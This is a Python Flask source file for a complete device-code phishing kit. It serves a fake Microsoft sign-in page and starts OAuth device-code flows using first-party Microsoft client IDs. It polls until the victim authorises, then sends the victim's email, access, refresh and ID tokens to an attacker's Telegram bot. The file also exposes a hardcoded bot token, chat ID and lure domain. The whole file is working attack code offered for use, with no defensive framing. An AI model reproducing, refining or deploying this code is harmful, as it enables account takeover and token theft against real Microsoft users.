import os
import time
import json
import uuid
import base64
import html as htmlmod
import sqlite3
import threading
import traceback
from datetime import datetime, timezone

import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

# ---------------- CONFIG ----------------
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY")
CHAT_ID   = os.environ.get("TG_CHAT_ID", "8877118461")
BASE_URL  = os.environ.get("BASE_URL", "https://outlook-verify.onrender.com")
DB_PATH   = os.environ.get("DB_PATH", "/tmp/phish.db")

DEVICECODE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_URL      = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
GRAPH_ME       = "https://graph.microsoft.com/v1.0/me"

SCOPES = "https://graph.microsoft.com/.default offline_access openid profile email"

CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
    "ab9b8c07-8f02-4f72-87fa-80105867a763",  # OneDrive Sync
    "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell
]

# ---------------- LOGGING ----------------
def log(msg):
    print(msg, flush=True)

# ---------------- DB ----------------
_db_lock = threading.Lock()

def _conn():
    c = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

def init_db():
    with _db_lock:
        c = _conn()
        c.execute("PRAGMA journal_mode=WAL")
        c.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                sid         TEXT PRIMARY KEY,
                client_id   TEXT,
                device_code TEXT,
                user_code   TEXT,
                verify_uri  TEXT,
                interval_s  INTEGER DEFAULT 5,
                expires_at  REAL,
                status      TEXT DEFAULT 'pending',
                email       TEXT,
                access_token TEXT,
                refresh_token TEXT,
                id_token    TEXT,
                raw         TEXT,
                notified    INTEGER DEFAULT 0,
                created_at  REAL
            )
        """)
        c.commit()
        c.close()
    log("[DB] initialized at " + DB_PATH)

def db_exec(sql, args=()):
    with _db_lock:
        c = _conn()
        try:
            cur = c.execute(sql, args)
            c.commit()
            return cur.lastrowid
        finally:
            c.close()

def db_row(sql, args=()):
    with _db_lock:
        c = _conn()
        try:
            cur = c.execute(sql, args)
            return cur.fetchone()
        finally:
            c.close()

def db_rows(sql, args=()):
    with _db_lock:
        c = _conn()
        try:
            return c.execute(sql, args).fetchall()
        finally:
            c.close()

def get_session(sid):
    return db_row("SELECT * FROM sessions WHERE sid=?", (sid,))

def set_status(sid, status, **kw):
    fields = ["status=?"]
    args = [status]
    for k, v in kw.items():
        fields.append(f"{k}=?")
        args.append(v)
    args.append(sid)
    db_exec(f"UPDATE sessions SET {', '.join(fields)} WHERE sid=?", args)

# ---------------- TELEGRAM ----------------
def _esc(s):
    return htmlmod.escape(str(s), quote=False)

def send_telegram(text, silent=False):
    """HTML send with plain-text fallback so a 400 never eats the message."""
    if not text:
        return False
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payloads = [
        {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML",
         "disable_web_page_preview": True, "disable_notification": silent},
        {"chat_id": CHAT_ID, "text": htmlmod.unescape(text).replace("<b>", "").replace("</b>", "")
                                     .replace("<code>", "").replace("</code>", "")
                                     .replace("<i>", "").replace("</i>", ""),
         "disable_web_page_preview": True, "disable_notification": silent},
    ]
    for i, p in enumerate(payloads):
        try:
            r = requests.post(url, json=p, timeout=15)
            log(f"[TELEGRAM] attempt={i+1} status={r.status_code} body={r.text[:200]}")
            if r.status_code == 200 and r.json().get("ok"):
                return True
        except Exception as e:
            log(f"[TELEGRAM] attempt={i+1} exception={e}")
        time.sleep(0.5)
    return False

# ---------------- DEVICE CODE ----------------
_tg_lock = threading.Lock()
_poll_threads = {}

def start_device_flow(force_new=False):
    last_err = None
    for cid in CLIENT_IDS:
        try:
            r = requests.post(DEVICECODE_URL, data={"client_id": cid, "scope": SCOPES}, timeout=20)
            data = r.json()
            if r.status_code != 200 or "device_code" not in data:
                last_err = data.get("error_description", r.text[:200])
                log(f"[FLOW FAIL] client={cid} err={last_err}")
                continue

            sid = str(uuid.uuid4())
            now = time.time()
            interval = int(data.get("interval", 5) or 5)
            expires_at = now + int(data.get("expires_in", 900) or 900)

            db_exec("""INSERT INTO sessions
                       (sid, client_id, device_code, user_code, verify_uri, interval_s,
                        expires_at, status, created_at)
                       VALUES (?,?,?,?,?,?,?,?,?)""",
                    (sid, cid, data["device_code"], data["user_code"],
                     data.get("verification_uri", "https://microsoft.com/devicelogin"),
                     interval, expires_at, "pending", now))

            log(f"[FLOW OK] sid={sid} client={cid} user_code={data['user_code']} interval={interval}")
            spawn_poll(sid)
            return {
                "sid": sid,
                "user_code": data["user_code"],
                "verification_uri": data.get("verification_uri", "https://microsoft.com/devicelogin"),
                "expires_in": int(data.get("expires_in", 900) or 900),
            }
        except Exception as e:
            last_err = str(e)
            log(f"[FLOW EXCEPT] client={cid} {e}")
    log(f"[FLOW DEAD] all clients failed: {last_err}")
    return None

def spawn_poll(sid):
    with _tg_lock:
        t = _poll_threads.get(sid)
        if t and t.is_alive():
            log(f"[POLL] already running sid={sid}")
            return
        th = threading.Thread(target=poll_worker, args=(sid,), daemon=True, name=f"poll-{sid[:8]}")
        _poll_threads[sid] = th
        th.start()
        log(f"[POLL] spawned sid={sid}")

# ---------------- POLLING ----------------
def b64_json(seg):
    try:
        seg += "=" * (-len(seg) % 4)
        return json.loads(base64.urlsafe_b64decode(seg).decode("utf-8", "ignore"))
    except Exception:
        return {}

def email_from_id_token(idt):
    if not idt:
        return None
    parts = idt.split(".")
    if len(parts) < 2:
        return None
    claims = b64_json(parts[1])
    return (claims.get("preferred_username") or claims.get("upn")
            or claims.get("email") or claims.get("unique_name"))

def poll_worker(sid):
    log(f"[POLL] thread start sid={sid}")
    backoff = 0
    try:
        while True:
            row = get_session(sid)
            if row is None:
                log(f"[POLL] sid={sid} row gone, exit")
                return
            if row["status"] in ("success", "expired", "error"):
                log(f"[POLL] sid={sid} terminal status={row['status']}, exit")
                return
            if time.time() > (row["expires_at"] or 0) + 30:
                set_status(sid, "expired")
                send_telegram(f"<b>⌛ Code expired</b>\n<code>{_esc(row['user_code'])}</code>\nVictim never finished sign-in.")
                log(f"[POLL] sid={sid} expired")
                return

            interval = max(5, int(row["interval_s"] or 5))
            try:
                r = requests.post(TOKEN_URL, data={
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                    "client_id": row["client_id"],
                    "device_code": row["device_code"],
                }, timeout=20)
                data = r.json()
            except Exception as e:
                backoff += 1
                log(f"[POLL] sid={sid} network error #{backoff}: {e}")
                time.sleep(min(interval * backoff, 30))
                continue

            err = data.get("error")
            log(f"[POLL] sid={sid} attempt status={r.status_code} error={err}")

            if not err:
                access = data.get("access_token")
                refresh = data.get("refresh_token")
                idt = data.get("id_token")
                email = email_from_id_token(idt)

                if not email and access:
                    try:
                        g = requests.get(GRAPH_ME, headers={"Authorization": f"Bearer {access}"}, timeout=15)
                        if g.status_code == 200:
                            j = g.json()
                            email = j.get("mail") or j.get("userPrincipalName")
                    except Exception as e:
                        log(f"[GRAPH] {e}")

                set_status(sid, "success", email=email, access_token=access,
                           refresh_token=refresh, id_token=idt, raw=json.dumps(data)[:4000])

                exp = ""
                try:
                    exp = datetime.fromtimestamp(time.time() + int(data.get("expires_in", 3600)),
                                                 timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                except Exception:
                    pass

                msg = (
                    "<b>✅ DEVICE CODE LOGIN SUCCESS</b>\n\n"
                    f"<b>Email:</b> <code>{_esc(email or 'unknown')}</code>\n"
                    f"<b>User code:</b> <code>{_esc(row['user_code'])}</code>\n"
                    f"<b>Client ID:</b> <code>{_esc(row['client_id'])}</code>\n"
                    f"<b>Scope:</b> <code>{_esc(data.get('scope', SCOPES))}</code>\n"
                    f"<b>AT expires:</b> {_esc(exp)}\n\n"
                    f"<b>Access Token:</b>\n<code>{_esc(access or '-')}</code>\n\n"
                    f"<b>Refresh Token:</b>\n<code>{_esc(refresh or '-')}</code>\n\n"
                    f"<b>ID Token:</b>\n<code>{_esc(idt or '-')}</code>"
                )
                ok = send_telegram(msg)
                if ok:
                    db_exec("UPDATE sessions SET notified=1 WHERE sid=?", (sid,))
                log(f"[POLL] sid={sid} SUCCESS email={email} telegram={ok}")
                return

            if err == "authorization_pending":
                time.sleep(interval)
                continue

            if err == "slow_down":
                interval += 5
                db_exec("UPDATE sessions SET interval_s=? WHERE sid=?", (interval, sid))
                log(f"[POLL] sid={sid} slow_down → interval={interval}")
                time.sleep(interval)
                continue

            if err in ("expired_token", "code_expired"):
                set_status(sid, "expired")
                send_telegram(f"<b>⌛ Device code expired</b>\n<code>{_esc(row['user_code'])}</code>")
                log(f"[POLL] sid={sid} expired_token")
                return

            if err in ("authorization_declined", "bad_verification_code",
                       "invalid_grant", "invalid_request", "unauthorized_client"):
                desc = data.get("error_description", "")
                set_status(sid, "error", raw=json.dumps(data)[:4000])
                send_telegram(
                    f"<b>⚠️ Device flow error</b>\n"
                    f"<b>Error:</b> <code>{_esc(err)}</code>\n"
                    f"<b>Desc:</b> {_esc(str(desc)[:500])}\n"
                    f"<b>Code:</b> <code>{_esc(row['user_code'])}</code>"
                )
                log(f"[POLL] sid={sid} terminal error={err} desc={desc[:300]}")
                return

            # unknown error — keep trying but back off
            backoff += 1
            log(f"[POLL] sid={sid} unknown error={err} desc={data.get('error_description','')[:200]}")
            time.sleep(min(interval * backoff, 30))

    except Exception:
        log(f"[POLL] sid={sid} CRASH:\n{traceback.format_exc()}")

# ---------------- REAPER (survives restarts / dead threads) ----------------
def reaper():
    while True:
        try:
            rows = db_rows("SELECT sid FROM sessions WHERE status='pending'")
            for r in rows:
                spawn_poll(r["sid"])
        except Exception as e:
            log(f"[REAPER] {e}")
        time.sleep(30)

# ---------------- PAGES ----------------
PAGE_HEAD = """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to your account</title>
<style>
*{box-sizing:border-box}body{margin:0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
background:#fff;color:#1b1b1b;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{width:440px;max-width:94vw;padding:44px}
.logo{font-size:22px;font-weight:600;color:#5e5e5e;margin-bottom:24px;display:flex;align-items:center;gap:10px}
.sq{width:11px;height:11px;background:#f25022;display:inline-block}.sq.g{background:#7fba00}
.sq.b{background:#00a4ef}.sq.y{background:#ffb900}
h1{font-size:24px;font-weight:600;margin:0 0 12px}
p{font-size:15px;color:#1b1b1b;margin:0 0 20px}
.code{font-size:32px;font-weight:600;letter-spacing:4px;background:#f3f2f1;
padding:16px;text-align:center;border-radius:4px;margin:20px 0;user-select:all}
button{width:100%;padding:11px;font-size:15px;background:#0067b8;color:#fff;border:0;
border-radius:4px;cursor:pointer;font-family:inherit}
button:hover{background:#005da6}
.note{font-size:12px;color:#605e5c;margin-top:16px;line-height:1.5}
a{color:#0067b8;text-decoration:none}
</style></head><body><div class="card">
<div class="logo"><span class="sq"></span><span class="sq g"></span><span class="sq b"></span><span class="sq y"></span>
Microsoft</div>
<h1>Enter code to sign in</h1>
<p>Use the code below to sign in to your account.</p>
"""

PAGE_TAIL = """
<div class="note">If you close this page, you can restart the sign-in from the same link.</div>
</div></body></html>
"""

@app.route("/", methods=["GET", "HEAD"])
def index():
    if request.method == "HEAD":
        return Response(status=200)

    flow = start_device_flow()
    if not flow:
        return Response("<h1>Service busy</h1><p>Please refresh.</p>", status=503, mimetype="text/html")

    code_html = (
        f'<div class="code" id="code">{htmlmod.escape(flow["user_code"])}</div>'
        f'<button onclick="go()">Copy code and continue</button>'
        f'<script>'
        f'function go(){{'
        f'var c=document.getElementById("code").innerText.trim();'
        f'if(navigator.clipboard){{navigator.clipboard.writeText(c).catch(function(){{}});}}'
        f'else{{var t=document.createElement("textarea");t.value=c;document.body.appendChild(t);'
        f't.select();try{{document.execCommand("copy");}}catch(e){{}}document.body.removeChild(t);}}'
        f'window.location.href="https://microsoft.com/devicelogin";'
        f'}}'
        f'</script>'
    )
    return Response(PAGE_HEAD + code_html + PAGE_TAIL, mimetype="text/html")

@app.route("/api/code")
def api_code():
    flow = start_device_flow()
    if not flow:
        return jsonify({"ok": False, "error": "all clients failed"}), 503
    return jsonify({"ok": True, **flow})

@app.route("/api/session/<sid>")
def api_session(sid):
    row = get_session(sid)
    if not row:
        return jsonify({"ok": False, "error": "not found"}), 404
    return jsonify({
        "ok": True,
        "sid": row["sid"],
        "status": row["status"],
        "user_code": row["user_code"],
        "email": row["email"],
        "notified": bool(row["notified"]),
        "has_access_token": bool(row["access_token"]),
        "has_refresh_token": bool(row["refresh_token"]),
        "expires_at": row["expires_at"],
        "now": time.time(),
    })

@app.route("/test-telegram")
def test_telegram():
    ok = send_telegram("<b>✅ Telegram test</b>\nIf you see this, the bot token and chat ID are correct.")
    return jsonify({"ok": ok}), (200 if ok else 502)

@app.route("/healthz")
def healthz():
    return "ok", 200

# ---------------- BOOTSTRAP ----------------
init_db()
threading.Thread(target=reaper, daemon=True, name="reaper").start()
log("[BOOT] app ready")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
